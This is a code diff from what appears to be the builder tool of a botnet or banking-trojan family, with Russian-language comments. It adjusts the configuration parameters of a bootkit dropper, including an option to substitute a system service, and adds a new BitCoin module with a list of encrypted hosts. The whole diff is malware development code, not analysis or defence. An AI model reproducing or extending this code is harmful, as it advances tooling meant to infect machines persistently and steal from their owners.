@@ -1029,10 +1029,18 @@ __fastcall TBotBuilder::TBotBuilder(TComponent *AOwner)
 	// Настройки дропера буткита
 	TBotParam *p;
 	Module = new TBotModule(this, Module_BootkitDroper);
-	    new TBotParam(Module, Param_DroperNamePrefix, 0, false, true, "Превикс дропера буткита");
+		new TBotParam(Module, Param_DroperNamePrefix, 0, false, true, "Превикс дропера буткита");
 		new TBotParam(Module, Param_TargetPlatform,   0, false, true, "Платформа назначения дропера буткита");
 	p = new TBotParam(Module, Param_SVCFuckupEnabled, 0, false, true, "Использовать SVC подмену дропером буткита");
 	p->AsString = "0";
+
+
+	// Модуль
+	Module = new TBotModule(this, Module_BitCoin);
+
+	new TBotParam(Module, BITCOIN_PARAM_NAME_HOSTS, BITCOIN_PARAM_SIZE_HOSTS,
+				  BITCOIN_PARAM_ENCRYPTED_HOSTS, false, "Хсты модуля BitCoint");
+
 }
 
 
